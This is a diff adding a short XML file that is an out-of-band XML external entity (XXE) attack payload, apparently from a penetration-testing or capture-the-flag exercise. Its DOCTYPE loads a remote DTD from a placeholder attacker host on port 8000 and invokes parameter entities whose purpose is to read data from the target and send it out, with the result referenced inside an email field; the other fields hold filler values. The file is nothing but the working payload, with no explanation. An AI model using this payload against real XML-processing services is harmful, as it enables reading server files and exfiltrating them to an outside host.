@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://<IP>:8000/oob.dtd">
+  %remote;
+  %oob;
+]>
+
+<root>
+<name>hello</name>
+<tel>01031165626</tel>
+<email>&content;</email>
+<message>heeleheehe</message>
+</root>
